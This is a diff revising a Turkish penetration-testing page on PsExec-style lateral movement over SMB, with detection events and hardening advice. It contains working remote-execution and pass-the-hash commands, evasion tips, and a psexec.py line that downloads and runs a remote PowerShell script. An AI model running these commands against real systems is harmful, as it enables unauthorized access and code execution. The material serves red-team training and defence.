@@ -4,23 +4,23 @@
 
 ## Nasıl çalışırlar
 
-Bu teknikler, hedef bir ana bilgisayarda komutları yürütmek için SMB/RPC üzerinden Windows Service Control Manager (SCM) kullanır. Ortak akış şudur:
+Bu teknikler, hedef host üzerinde komut çalıştırmak için Windows Service Control Manager'ı (SCM) SMB/RPC üzerinden uzaktan kötüye kullanır. Genel akış şöyledir:
 
-1. Hedefe kimlik doğrulaması yapın ve SMB (TCP/445) üzerinden ADMIN$ paylaşımına erişin.
-2. Yürütülebilir bir dosya kopyalayın veya hizmetin çalıştıracağı bir LOLBAS komut satırı belirtin.
-3. O komut veya ikili dosyaya işaret eden SCM (MS-SCMR üzerinden \PIPE\svcctl) aracılığıyla uzaktan bir hizmet oluşturun.
-4. Yükü yürütmek için hizmeti başlatın ve isteğe bağlı olarak stdin/stdout'u adlandırılmış bir boru aracılığıyla yakalayın.
-5. Hizmeti durdurun ve temizleyin (hizmeti ve bırakılan ikili dosyaları silin).
+1. Hedefte kimlik doğrulaması yapın ve SMB (TCP/445) üzerinden ADMIN$ paylaşımına erişin.
+2. Bir executable kopyalayın veya servisin çalıştıracağı bir LOLBAS command line belirtin.
+3. Bu komuta veya binary'ye işaret eden bir servisi, SCM üzerinden uzaktan oluşturun (MS-SCMR over \PIPE\svcctl).
+4. Payload'u çalıştırmak için servisi başlatın ve isteğe bağlı olarak stdin/stdout'u named pipe üzerinden yakalayın.
+5. Servisi durdurun ve temizleyin (servisi ve bırakılan binary'leri silin).
 
-Gereksinimler/ön koşullar:
-- Hedefte Yerel Yönetici (SeCreateServicePrivilege) veya hedefte açık hizmet oluşturma hakları.
-- SMB (445) erişilebilir ve ADMIN$ paylaşımı mevcut; Uzak Hizmet Yönetimi ana bilgisayar güvenlik duvarı aracılığıyla izinli.
-- UAC Uzak Kısıtlamaları: yerel hesaplarla, token filtreleme ağ üzerinden yöneticiyi engelleyebilir, yalnızca yerleşik Yönetici veya LocalAccountTokenFilterPolicy=1 kullanılıyorsa.
-- Kerberos vs NTLM: bir ana bilgisayar adı/FQDN kullanmak Kerberos'u etkinleştirir; IP ile bağlanmak genellikle NTLM'ye geri döner (ve sertleştirilmiş ortamlarda engellenebilir).
+Gereksinimler/prereqs:
+- Hedefte Local Administrator (SeCreateServicePrivilege) veya hedefte açık service creation hakları.
+- SMB (445) erişilebilir olmalı ve ADMIN$ paylaşımı kullanılabilir durumda olmalı; Remote Service Management host firewall üzerinden izinli olmalı.
+- UAC Remote Restrictions: local accounts kullanıldığında, built-in Administrator veya LocalAccountTokenFilterPolicy=1 kullanılmadıkça token filtering ağ üzerinden admin erişimini engelleyebilir.
+- Kerberos vs NTLM: hostname/FQDN kullanmak Kerberos'u etkinleştirir; IP ile bağlanmak genellikle NTLM'e geri döner (ve hardened ortamlarda engellenebilir).
 
-### Manuel ScExec/WinExec sc.exe aracılığıyla
+### sc.exe ile Manual ScExec/WinExec
 
-Aşağıda, minimum bir hizmet oluşturma yaklaşımı gösterilmektedir. Hizmet görüntüsü, bırakılan bir EXE veya cmd.exe veya powershell.exe gibi bir LOLBAS olabilir.
+Aşağıdaki örnek, minimal bir service-creation yaklaşımını gösterir. Service image, bırakılan bir EXE veya cmd.exe ya da powershell.exe gibi bir LOLBAS olabilir.
 ```cmd
 :: Execute a one-liner without dropping a binary
 sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
@@ -34,17 +34,17 @@ sc.exe \\TARGET start HTSvc
 sc.exe \\TARGET delete HTSvc
 ```
 Notlar:
-- Bir hizmet olmayan EXE başlatıldığında bir zaman aşımı hatası bekleyin; yürütme yine de gerçekleşir.
-- Daha OPSEC dostu kalmak için, dosyasız komutları (cmd /c, powershell -enc) tercih edin veya bırakılan artefaktları silin.
+- Service olmayan bir EXE başlatılırken timeout hatası bekleyin; execution yine de gerçekleşir.
+- Daha OPSEC-friendly kalmak için fileless commands (`cmd /c`, `powershell -enc`) kullanmayı veya bırakılan artifact'leri silmeyi tercih edin.
 
-Daha ayrıntılı adımları bulmak için: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/
+Daha ayrıntılı adımları şurada bulabilirsiniz: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>
 
 ## Araçlar ve örnekler
 
 ### Sysinternals PsExec.exe
 
-- SMB kullanarak PSEXESVC.exe'yi ADMIN$'ye bırakan, geçici bir hizmet (varsayılan adı PSEXESVC) kuran ve I/O'yu adlandırılmış borular üzerinden yönlendiren klasik bir yönetici aracı.
-- Örnek kullanımlar:
+- SMB kullanarak ADMIN$ içine PSEXESVC.exe bırakan, geçici bir service kuran (varsayılan ad PSEXESVC) ve I/O'yu named pipes üzerinden proxy'leyen klasik bir admin aracıdır.
+- Kullanım örnekleri:<sup>[[1]](#references)</sup>
 ```cmd
 :: Interactive SYSTEM shell on remote host
 PsExec64.exe -accepteula \\HOST -s -i cmd.exe
@@ -55,16 +55,16 @@ PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami 
 :: Customize the service name for OPSEC (-r)
 PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
 ```
-- WebDAV üzerinden Sysinternals Live'dan doğrudan başlatabilirsiniz:
+- Sysinternals Live üzerinden WebDAV ile doğrudan çalıştırabilirsiniz:
 ```cmd
 \\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
 ```
 OPSEC
-- Servis kurulum/kaldırma olayları bırakır (Servis adı genellikle PSEXESVC'dir, -r kullanılmadıkça) ve yürütme sırasında C:\Windows\PSEXESVC.exe oluşturur.
+- Servis yükleme/kaldırma olayları bırakır (servis adı, `-r` kullanılmadığında genellikle PSEXESVC olur) ve çalıştırma sırasında `C:\Windows\PSEXESVC.exe` oluşturur.
 
-### Impacket psexec.py (PsExec benzeri)
+### Impacket psexec.py (PsExec-like)
 
-- Gömülü bir RemCom benzeri hizmet kullanır. ADMIN$ üzerinden geçici bir hizmet ikili dosyası (genellikle rastgele ad) bırakır, bir hizmet oluşturur (varsayılan genellikle RemComSvc'dir) ve I/O'yu adlandırılmış bir boru hattı üzerinden yönlendirir.
+- Embedded RemCom-like bir servis kullanır. ADMIN$ üzerinden geçici bir servis binary'si (genellikle rastgeleleştirilmiş adla) bırakır, bir servis oluşturur (varsayılan genellikle RemComSvc) ve I/O'yu bir named pipe üzerinden proxy'ler.
 ```bash
 # Password auth
 psexec.py DOMAIN/user:Password@HOST cmd.exe
@@ -79,77 +79,74 @@ psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe
 psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
 ```
 Artifacts
-- Geçici EXE C:\Windows\ içinde (rastgele 8 karakter). Hizmet adı, üzerine yazılmadığı sürece varsayılan olarak RemComSvc'dir.
+- C:\Windows\ içinde geçici bir EXE (8 rastgele karakter). Service name, üzerine yazılmadığı sürece varsayılan olarak RemComSvc olur.
 
 ### Impacket smbexec.py (SMBExec)
 
-- cmd.exe'yi başlatan geçici bir hizmet oluşturur ve I/O için adlandırılmış bir boru kullanır. Genellikle tam bir EXE yükü bırakmaktan kaçınır; komut yürütme yarı etkileşimlidir.
+- cmd.exe başlatan ve I/O için named pipe kullanan geçici bir service oluşturur. Genellikle tam bir EXE payload bırakmaktan kaçınır; command execution yarı etkileşimlidir.
 ```bash
 smbexec.py DOMAIN/user:Password@HOST
 smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
 ```
-### SharpLateral ve SharpMove
+### SharpLateral and SharpMove
 
-- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) hizmet tabanlı exec dahil olmak üzere birkaç yan hareket yöntemini uygular.
+- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#), service-based exec dahil olmak üzere birkaç lateral movement methodunu uygular.
 ```cmd
 SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
 ```
-- [SharpMove](https://github.com/0xthirteen/SharpMove), bir komutu uzaktan çalıştırmak için hizmet değiştirme/oluşturma içerir.
+- [SharpMove](https://github.com/0xthirteen/SharpMove), bir komutu uzaktan çalıştırmak için service modification/creation içerir.
 ```cmd
 SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
 SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
 ```
-- Farklı arka uçlar (psexec/smbexec/wmiexec) aracılığıyla çalıştırmak için CrackMapExec'i de kullanabilirsiniz:
+- Ayrıca farklı backend'ler (psexec/smbexec/wmiexec) üzerinden execute etmek için CrackMapExec kullanabilirsiniz:
 ```bash
 cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
 cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
 ```
-## OPSEC, tespit ve artefaktlar
+## OPSEC, tespit ve izler
 
-PsExec benzeri teknikler kullanırken tipik host/ağ artefaktları:
-- Hedefte kullanılan admin hesabı için Güvenlik 4624 (Oturum Açma Türü 3) ve 4672 (Özel Ayrıcalıklar).
-- ADMIN$ erişimini ve hizmet ikili dosyalarının oluşturulmasını/yazılmasını gösteren Güvenlik 5140/5145 Dosya Paylaşımı ve Dosya Paylaşımı Ayrıntılı olayları (örn. PSEXESVC.exe veya rastgele 8 karakterli .exe).
-- Hedefteki Hizmet Yüklemesi için Güvenlik 7045: PSEXESVC, RemComSvc veya özel (-r / -service-name) gibi hizmet adları.
-- services.exe veya hizmet görüntüsü için Sysmon 1 (Süreç Oluşturma), 3 (Ağ Bağlantısı), 11 (Dosya Oluşturma) C:\Windows\ içinde, \\.\pipe\psexesvc, \\.\pipe\remcom_* veya rastgele eşdeğerleri için 17/18 (Borular Oluşturuldu/Bağlandı).
-- Sysinternals EULA için Kayıt defteri artefaktı: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 operatör hostunda (eğer bastırılmamışsa).
+PsExec benzeri teknikler kullanılırken oluşan tipik host/ağ izleri:
+- Kullanılan admin hesabı için hedefte Security 4624 (Logon Type 3) ve 4672 (Special Privileges) olayları.
+- ADMIN$ erişimini ve service binary'lerinin oluşturulmasını/yazılmasını gösteren Security 5140/5145 File Share ve File Share Detailed olayları (ör. PSEXESVC.exe veya rastgele 8 karakterli .exe).
+- Hedefte Security 7045 Service Install: PSEXESVC, RemComSvc veya özel service adları (-r / -service-name).
+- services.exe veya service image için Sysmon 1 (Process Create), 3 (Network Connect), C:\Windows\ içindeki dosyalar için 11 (File Create), \\.\pipe\psexesvc, \\.\pipe\remcom_* veya rastgele eşdeğerleri gibi pipe'lar için 17/18 (Pipe Created/Connected).
+- Sysinternals EULA için operator host üzerinde Registry izi: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 (bastırılmamışsa).
 
-Av fikirleri
-- ImagePath cmd.exe /c, powershell.exe veya TEMP konumlarını içeren hizmet yüklemeleri için uyarı verin.
-- ParentImage C:\Windows\PSEXESVC.exe olan veya LOCAL SYSTEM olarak çalışan services.exe'nin çocukları olan süreç oluşturma işlemlerini arayın.
-- -stdin/-stdout/-stderr ile biten veya iyi bilinen PsExec klon boru adlarını işaretleyin.
+Hunting fikirleri
+- ImagePath içinde cmd.exe /c, powershell.exe veya TEMP konumları bulunan service install işlemleri için alert oluşturun.
+- ParentImage değeri C:\Windows\PSEXESVC.exe olan veya services.exe alt öğesi olarak LOCAL SYSTEM ile çalışan shell'leri başlatan process creation olaylarını arayın.
+- -stdin/-stdout/-stderr ile biten veya iyi bilinen PsExec clone pipe adlarını kullanan named pipe'ları işaretleyin.
 
-## Yaygın hataları giderme
-- Hizmetler oluşturulurken Erişim reddedildi (5): gerçekten yerel admin olmama, yerel hesaplar için UAC uzaktan kısıtlamaları veya hizmet ikili dosyası yolunda EDR müdahale koruması.
-- Ağ yolu bulunamadı (53) veya ADMIN$'ye bağlanılamadı: SMB/RPC'yi engelleyen güvenlik duvarı veya admin paylaşımlarının devre dışı bırakılması.
-- Kerberos başarısız oluyor ama NTLM engelleniyor: IP yerine hostname/FQDN kullanarak bağlanın, uygun SPN'leri sağlayın veya Impacket kullanırken biletlerle -k/-no-pass verin.
-- Hizmet başlatma süresi doluyor ama yük çalıştı: gerçek bir hizmet ikili dosyası değilse beklenir; çıktıyı bir dosyaya yakalayın veya canlı I/O için smbexec kullanın.
+## Yaygın hatalarda troubleshooting
+- Service oluşturulurken Access is denied (5): gerçekten local admin olunmaması, local account'lar için UAC remote restrictions veya service binary path üzerinde EDR tamper protection.
+- The network path was not found (53) veya ADMIN$ bağlantısı kurulamadı: firewall SMB/RPC'yi engelliyor ya da admin share'ler devre dışı.
+- Kerberos başarısız oluyor ancak NTLM engellenmiş: hostname/FQDN ile (IP yerine) bağlanın, uygun SPN'leri doğrulayın veya Impacket kullanırken ticket'larla -k/-no-pass sağlayın.
+- Service start zaman aşımına uğruyor ancak payload çalıştı: gerçek bir service binary'si kullanılmıyorsa bu beklenen bir durumdur; çıktıyı bir dosyaya kaydedin veya canlı I/O için smbexec kullanın.
 
-## Güçlendirme notları
-- Windows 11 24H2 ve Windows Server 2025, varsayılan olarak dışa dönük (ve Windows 11 içe dönük) bağlantılar için SMB imzalamayı gerektirir. Bu, geçerli kimlik bilgileri ile meşru PsExec kullanımını bozmaz ancak imzasız SMB relay istismarını önler ve imzalamayı desteklemeyen cihazları etkileyebilir.
-- Yeni SMB istemcisi NTLM engelleme (Windows 11 24H2/Server 2025), IP ile bağlanırken veya Kerberos olmayan sunuculara bağlanırken NTLM geri dönüşünü engelleyebilir. Güçlendirilmiş ortamlarda bu, NTLM tabanlı PsExec/SMBExec'i bozacaktır; Kerberos (hostname/FQDN) kullanın veya meşru ihtiyaç durumunda istisnalar yapılandırın.
-- En az ayrıcalık ilkesi: yerel admin üyeliğini en aza indirin, Just-in-Time/Just-Enough Admin'i tercih edin, LAPS'ı zorlayın ve 7045 hizmet yüklemeleri üzerinde izleme/uyarı yapın.
+## Hardening notları
+- Windows 11 24H2 ve Windows Server 2025, outbound (ve Windows 11 inbound) bağlantılar için varsayılan olarak SMB signing gerektirir. Bu durum geçerli credential'larla yapılan meşru PsExec kullanımını bozmaz; ancak unsigned SMB relay abuse'u önler ve signing desteklemeyen cihazları etkileyebilir.<sup>[[2]](#references)</sup>
+- Yeni SMB client NTLM blocking özelliği (Windows 11 24H2/Server 2025), IP ile veya Kerberos kullanmayan server'lara bağlanırken NTLM fallback'i engelleyebilir. Hardened ortamlarda bu, NTLM tabanlı PsExec/SMBExec'i bozacaktır; Kerberos kullanın (hostname/FQDN) veya meşru olarak gerekiyorsa exception'lar yapılandırın.<sup>[[2]](#references)</sup>
+- Least privilege ilkesi: local admin üyeliğini en aza indirin, Just-in-Time/Just-Enough Admin yaklaşımını tercih edin, LAPS'ı zorunlu tutun ve 7045 service install işlemlerini izleyip bunlar için alert oluşturun.
 
-## Ayrıca bakınız
+## Ayrıca bkz.
 
-- WMI tabanlı uzaktan yürütme (genellikle daha dosyasız):
-
+- WMI tabanlı remote exec (genellikle daha fazla fileless):
 
 {{#ref}}
 ./wmiexec.md
 {{#endref}}
 
-- WinRM tabanlı uzaktan yürütme:
-
+- WinRM tabanlı remote exec:
 
 {{#ref}}
 ./winrm.md
 {{#endref}}
 
+## References
 
-
-## Referanslar
-
-- PsExec - Sysinternals | Microsoft Learn: https://learn.microsoft.com/sysinternals/downloads/psexec
-- Windows Server 2025 & Windows 11'de SMB güvenlik güçlendirmesi (varsayılan olarak imzalama, NTLM engelleme): https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591
+- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
+- [2] [SMB security hardening in Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
+- [3] [Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
 
 {{#include ../../banners/hacktricks-training.md}}
